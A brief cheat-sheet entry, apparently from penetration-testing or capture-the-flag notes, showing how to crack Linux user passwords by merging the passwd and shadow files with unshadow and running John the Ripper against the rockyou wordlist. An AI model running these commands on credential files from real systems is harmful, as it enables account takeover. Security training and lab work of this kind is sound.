If you have both the passwd and shadow files, you can crack the user's passwords running the following commands:

1.) Put them in one file:
```
unshadow passwd shadow > enc.txt
```

2.) Crack the password using john:
```
john --wordlist=/usr/share/wordlist/rockyou.txt enc.txt
```

